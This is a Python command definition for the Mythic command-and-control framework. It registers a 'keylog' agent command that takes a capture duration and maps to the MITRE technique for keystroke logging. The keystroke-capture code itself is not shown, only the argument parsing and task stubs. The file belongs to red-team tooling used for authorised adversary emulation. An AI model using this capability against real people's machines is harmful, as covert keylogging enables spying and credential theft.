from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class KeylogArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="duration",
                type=ParameterType.Number,
                default_value=10,
                description="Duration in seconds to capture keystrokes (default: 10)",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except Exception:
                self.add_arg("duration", int(self.command_line.strip()))


class KeylogCommand(CommandBase):
    cmd = "keylog"
    needs_admin = False
    help_cmd = "keylog [duration_seconds]"
    description = "Capture keystrokes for a specified duration using GetAsyncKeyState polling. The agent will be unresponsive during capture."
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1056.001"]
    argument_class = KeylogArguments
    attributes = CommandAttributes(builtin=False)

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )
        duration = taskData.args.get_arg("duration")
        response.DisplayParams = f"{duration}s"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
